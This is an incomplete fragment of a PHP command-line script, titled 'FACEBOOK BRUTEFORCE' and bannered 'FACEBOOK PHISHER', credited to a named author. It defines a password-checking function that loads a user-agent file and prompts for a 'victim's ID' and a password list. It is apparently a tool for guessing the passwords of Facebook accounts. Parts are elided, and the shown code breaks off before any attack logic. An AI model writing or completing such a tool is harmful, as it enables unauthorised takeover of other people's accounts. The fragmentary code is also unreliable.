...
/*
  * FACEBOOK BRUTEFORCE
  * SCRIPT CREATED BY MOHAMMAD AIJAZ
*/
function check($user, $pass) {
	$fileua = 'userAgent.txt';
...
┃┃╱╱┃╭━╮┃╰━╯┃╰━━┫╰━╯┃╰━╯┃╰━╯┃┃┃╰╮
╰╯╱╱╰╯╱╰┻━━━┻━━━┻━━━┻━━━┻━━━┻╯╰━╯
".$blue."       .:.:.FACEBOOK PHISHER.:.:.
".$cyan."       .:.:.SCRIPT CREATED BY MOHAMMAD AIJAZ\n\n".$nc;
$file = $_SERVER[argv][1];
echo "$white VICTIM'S ID TARGET:$yellow ";
$user = trim(fgets(STDIN));
echo "$white ENTER PASSWORD FILE:$yellow ";
